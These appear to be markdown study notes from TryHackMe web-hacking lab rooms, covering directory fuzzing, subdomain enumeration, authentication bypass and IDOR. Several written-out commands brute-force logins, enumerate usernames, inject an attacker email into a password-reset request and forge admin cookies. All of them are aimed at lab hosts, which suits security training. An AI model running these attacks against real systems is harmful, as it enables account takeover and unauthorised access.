## Content Discovery
- Wappalyzer (https://www.wappalyzer.com/)
- The Wayback Machine (https://archive.org/web/)
- Automated Discovery https://github.com/danielmiessler/SecLists 
- ffuf,  “Fuzz Faster you Fool” 
- ``` user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ ```
- dirb 
- ``` user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt ```
- gobuster
- ``` user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt ```

## Subdomain Enumeration
1. Certificate Transparency (CT) logs
- SSL/TLS Certificates. (https://crt.sh ; https://transparencyreport.google.com/https/certificates)
2. google search ```-site:www.tryhackme.com  site:*.tryhackme.com```
3. ``` dnsrecon -t brt -d acmeitsupport.thm ```
4. ``` ./sublist3r.py -d acmeitsupport.thm ```
5. private DNS server. "/etc/hosts" file (or c:\windows\system32\drivers\etc\hosts file for Windows users) 
6. ``` ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130 ```
7. ``` ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130 -fs {size} ``` -fs switch, which tells ffuf to ignore any results that are of the specified size.

## Authentication Bypass
**fuzz posibble exist usernames.**
- https://github.com/ffuf/ffuf
- ``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.94.177/customers/signup -mr "username already exists" ```
-  -X argument specifies the request method.
-  -d argument specifies the data that we are going to send.
-  -H argument is used for adding additional headers to the request. setting the "Content-Type" to the webserver knows we are sending form data. 
-  -u argument specifies the URL we are making the request to.
-  -mr argument is the text on the page we are looking for to validate we've found a valid username.

**brute force**
- ``` ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.2.151/customers/login -fc 200 ```
- -fc argument to check for an HTTP status code other than 200.

**logic flaw**
- ``` curl 'http://10.10.2.151/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm' ```
- the server send email to the address client posts

**cookie tempering**
- ``` curl -H "Cookie: logged_in=true; admin=true" http://10.10.2.151/cookie-test ```
- Hash crack website. https://crackstation.net/

## IDOR
-  Insecure Direct Object Reference

**find IDOR in Encode IDs**
- https://www.base64decode.org/; https://www.base64encode.org/ 

**find IDOR in Hashed IDs**
- https://crackstation.net/
